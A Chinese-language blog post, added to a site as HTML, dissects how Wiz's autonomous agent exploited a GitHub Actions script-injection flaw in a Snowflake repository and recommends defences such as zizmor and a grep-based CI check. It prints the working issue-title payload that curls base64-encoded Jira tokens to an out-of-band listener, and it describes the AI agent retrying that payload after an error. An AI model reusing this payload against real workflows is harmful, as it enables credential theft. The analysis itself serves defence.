@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI 漏报的漏洞，AI 自己打穿：Wiz Red Agent 攻破 Snowflake 内部 Jira 全拆解 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>AI 漏报的漏洞，AI 自己打穿：Wiz Red Agent 攻破 Snowflake 内部 Jira 全拆解</h1>
+<time>2026-09-10</time>
+<ul>
+<li>安全</li>
+<li>GitHub Actions</li>
+<li>AI</li>
+<li>CI/CD</li>
+</ul>
+<hr />
+<p>Wiz Research 上个月公开了一份漏洞报告，我读完觉得这是今年最值得写的 CI/CD 安全案例，没有之一。它的主角不是某个 CVE，而是两个 AI 在同一条链上的对撞。</p>
+<p>一边，GitHub Copilot Autofix 参与审查了 Snowflake 一个公开仓库的 PR，对其中引入脚本注入漏洞的那处改动，它给了 all-clear。GitHub 自家的 Advanced Security 扫描也跑了，同样没报。</p>
+<p>另一边，Wiz 的自主安全研究 agent（他们叫 Red Agent）在 Snowflake 的 HackerOne 赏金项目里，独立发现并利用了这个漏洞，拿到了 Snowflake 内部 Jira 的只读 token，从发现到外带凭据，全程没有人类介入。</p>
+<p>最扎眼的数字是这个：漏洞 6 月 18 日被合并进主分支，Red Agent 6 月 23 日就打穿了它。存活窗口只有 5 天。AI 写/审的代码引入了一个经典注入漏洞，另一个 AI 把它在 5 天内攻破。这就是整件事最值得琢磨的地方。</p>
+<h2>漏洞本体：模板展开和 shell 转义的顺序</h2>
+<p>出问题的是 Snowflake 的 .NET 连接器仓库 <code>snowflakedb/snowflake-connector-net</code>，里面有个 <code>jira_issue.yml</code> workflow，作用是 issue 打开时自动同步到内部 Jira。</p>
+<p>PR #1218（标题 "SNOW-2069227: Update jira workflows"）把原来安全的写法替换掉了。改之前是这样：</p>
+<div class="highlight"><pre><span></span><code><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">env</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">ISSUE_TITLE</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ github.event.issue.title }}</span>
+<span class="w">  </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">jq -n --arg title &quot;$ISSUE_TITLE&quot; ...</span>
+</code></pre></div>
+
+<p>改之后变成了：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
+<span class="w">  </span><span class="no">TITLE=$(echo &#39;${{ github.event.issue.title }}&#39; | sed &#39;s/&quot;/\\&quot;/g&#39; | sed &quot;s/&#39;/\\&#39;/g&quot;)</span>
+</code></pre></div>
+
+<p>问题出在执行顺序。GitHub Actions 的 <code>${{ }}</code> 模板展开发生在 shell 运行之前，<code>${{ github.event.issue.title }}</code> 会先被替换成 issue 标题的原始字符串，再交给 bash 执行。</p>
+<p>写这段代码的人显然想对单引号、双引号做转义，后面那两个 sed 就是干这个的。但转义发生在模板展开之后，等于先让不可信数据进了 shell，再试图补救。只要标题里带一个单引号，就能提前闭合 <code>echo '...'</code>，往后面接任意命令。</p>
+<p>这个反模式 GitHub 官方文档里有专门一节讲，叫 script injection，核心告诫就一句：不要直接把 <code>github.event.*</code> 这类不可信输入拼进 <code>run:</code> 块。道理谁都懂，但真实 PR 里还是照样出现，因为这种写法在历史代码里到处都是。</p>
+<h2>形同虚设的 Security Gate</h2>
+<p>这个 workflow 上挂着一个 <code>if:</code> 条件，看着像在做防护：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">if</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">(github.event_name == &#39;issues&#39; &amp;&amp; github.event.pull_request.user.login != &#39;whitesource-for-github-com[bot]&#39;)</span>
+</code></pre></div>
+
+<p>问题是 <code>github.event.pull_request</code> 只在 pull_request 事件里才有值。当事件是 <code>issues</code> 时，这个字段永远是 <code>null</code>。于是条件化简成 <code>null != 'whitesource-for-github-com[bot]'</code>，恒为真，任何 GitHub 用户打开一个 issue 都能触发 workflow。</p>
+<p>这类"看起来有防护，实际被事件类型的字段差异架空"的写法，在真实项目里极常见。写条件的人脑子里想的是 PR 场景，但 workflow 的触发条件是 <code>issues: opened</code>，两个上下文拼在一起，防护就漏了。</p>
+<h2>利用链：一个 issue 标题打穿</h2>
+<p>Wiz 构造的标题，核心是先用单引号闭合 <code>echo '...'</code>，再注入一段命令把环境变量里的 Jira 凭据发到外带监听器：</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39;; curl -s &quot;https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`&amp;e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&amp;u=`printf %s $JIRA_BASE_URL|base64 -w0`&quot; ; echo &#39;</span>
+</code></pre></div>
+
+<p>标题展开后，<code>echo '...'</code> 里的内容变成一段完整 shell：先用 <code>;</code> 结束 echo，执行 curl 把三个环境变量 base64 编码后拼进 URL 发出去，最后再用 <code>; echo '</code> 把语法重新闭合，避免后面残留的单引号报错。</p>
+<p>有个细节值得单独说。Red Agent 第一次尝试用的是 <code>#</code> 注释符，想注释掉后面的内容。结果 runner 返回 bash 语法错误，原因是 <code>#</code> 会把 <code>TITLE=$(...)</code> 的右括号一并注释掉，导致括号不闭合。这个 agent 没有停下来等人类，而是自己读了报错，把 payload 从 <code>#</code> 改成了 <code>; echo '</code>，然后成功收到回调。</p>
+<p>这个"读错误输出、调整 payload、重试"的闭环，比漏洞本身更值得关注。传统扫描器报完就完了，这种 agent 会自己把利用链走通。几秒内，外带监听器收到了来自 GitHub Actions runner（Azure IP 20.106.182.197）的回调，里面是 base64 编码的 Jira 凭据。</p>
+<h2>影响面</h2>
+<p>泄露的 token 对应 <code>qa@snowflake.net</code>，认证到 <code>snowflakecomputing.atlassian.net</code>，对 Snowflake 的工程、安全合规、漏洞赏金跟踪这几个项目有只读权限。</p>
+<p>注意是只读，没有数据被改写。但一个对内部 Jira 有只读权限的 token 落到攻击者手里，能看到的包括未公开的安全问题、内部工单、赏金项目的讨论。信息泄露本身就是严重事故，何况它还是通过一个公开仓库的 CI 流程拿到的。</p>
+<h2>为什么两套 AI 工具都没拦住</h2>
+<p>这次有两条独立的 AI 线同时"看走眼"，分开分析才有价值。</p>
+<p><strong>Copilot Autofix 漏报。</strong> 它在这个 PR 里确实贡献了一个修复，但那是对 <code>jira_close.yml</code> 的改动。对 <code>jira_issue.yml</code> 里引入注入的那处，它标了 all-clear。这不难理解：Autofix 这类工具擅长模式匹配和常见缺陷，而 script injection 的判定需要理解"模板展开在前、shell 转义在后"这种跨阶段的数据流。在静态层面，<code>${{ github.event.issue.title }}</code> 就是个字符串，它"不可信"这件事需要额外的污点源标注，而 CI 工作流文件的污点追踪一直是静态分析的薄弱环节。</p>
+<p><strong>GitHub Advanced Security 漏报。</strong> 报告里明确写了，扫描"显式提取了 jira_issue.yml workflow"，但没报注入。说明现有 CI 安全规则对"issue title 直接插值进 run"这种模式覆盖不足。</p>
+<p>更深一层是：这次漏洞是"安全写法被替换成不安全写法"造成的回归。原来的 <code>env:</code> + <code>jq --arg</code> 是安全的，PR 把它换成了直接插值，等于丢掉了一个安全约束。AI 生成代码有个已知倾向，它从训练数据里学到的大量历史代码里，直接插值这种写法占了多数，所以它在"纠正"或"简化"时，反而可能把安全写法改回反模式。</p>
+<h2>我的做法</h2>
+<p>这类问题有现成且便宜的防线，关键是别只靠 AI 审。</p>
+<ol>
+<li><strong>用 zizmor 查 CI 配置。</strong> zizmor 是专门扫 GitHub Actions 安全问题的工具，script injection、权限过宽、未固定 action 版本都能查。放进 CI 当硬门槛：</li>
+</ol>
+<p><code>bash
+   zizmor --format sarif .</code></p>
+<p>它在 CI 配置这块比通用扫描器细得多，正是这次 Advanced Security 漏掉的那一类。</p>
+<ol>
+<li>
+<p><strong>actionlint 查语法和表达式。</strong> 能抓到 workflow 里的表达式误用，和 zizmor 一起跑，互补。</p>
+</li>
+<li>
+<p><strong>把"安全写法"固化成 CI 检查，别靠自觉。</strong> 这次回归的本质是安全 pattern 没有被强制。可以在仓库里放一条 grep 检查，凡是在 <code>run:</code> 或 <code>script:</code> 里出现 <code>${{ github.event.issue.title }}</code>、<code>${{ github.event.comment.body }}</code>、<code>${{ github.event.pull_request.title }}</code> 这类直接插值，CI 直接 fail：</p>
+</li>
+</ol>
+<p><code>yaml
+   - name: 拒绝 script injection
+     run: |
+       if grep -rnE '\$\{\{\s*github\.event\.(issue|comment|pull_request|review)\b' .github/workflows/; then
+         echo "发现不可信输入直接插值进 run:，禁止合并" &amp;&amp; exit 1
+       fi</code></p>
+<p>一条规则挡住一整类问题，比事后补丁便宜得多。</p>
+<ol>
+<li><strong>给 issue 触发的 workflow 收紧 permissions。</strong> 这个 workflow 用的是仓库级 token，所以才能读到 Jira 的 secret。给 workflow 显式声明最小权限，哪怕注入成功，能拿的东西也有限：</li>
+</ol>
+<p><code>yaml
+   permissions:
+     contents: read
+     # 不声明 issues: write 之类的高权限</code></p>
+<p>顺带一提，很多人会把 <code>pull_request</code> 和 <code>pull_request_target</code> 的权限模型搞混。后者带着目标仓库的 token 运行，一旦配合脚本注入，后果比普通 workflow 严重得多，能用前者解决的问题别用后者。</p>
+<ol>
+<li><strong>短期凭据 + OIDC。</strong> Jira token 是长期静态的。换成短期 token 或 OIDC 联合，能把这类泄露的窗口压到最小。</li>
+</ol>
+<p>一句话收尾：这次的教训不是"AI 会写出漏洞"这种老生常谈，而是两件事同时加速了。AI 在写代码时可能把安全写法改回反模式，而另一个 AI 在发现漏洞时比以前快一个数量级。漏洞从"活几个月"变成"活 5 天"，防御也得从"事后审计"变成"把安全 pattern 固化成 CI 里的硬检查"。</p>
+<h2>⚠️ 网络安全免责声明</h2>
+<p>本文内容仅供技术研究与安全学习之用。文中描述的漏洞分析、攻击链拆解和代码示例均基于公开披露的安全研究，旨在帮助开发者理解攻击原理、提升安全意识和防御能力。</p>
+<p>请勿将本文所述技术用于任何未经授权的安全测试、渗透攻击或非法用途。任何因滥用本文信息而造成的法律后果，由使用者自行承担，与本文作者无关。</p>
+<p>如发现系统安全漏洞，请通过合法渠道向相关厂商或平台报告，共同维护网络安全生态。</p>
+<hr />
+<p>参考：Wiz Blog《Wiz Red Agent Finds Its Way Into Snowflake's Internal Jira Through a Flaw in a GitHub Copilot–Assisted PR》（Gal Nagli, 2026-08-17）</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
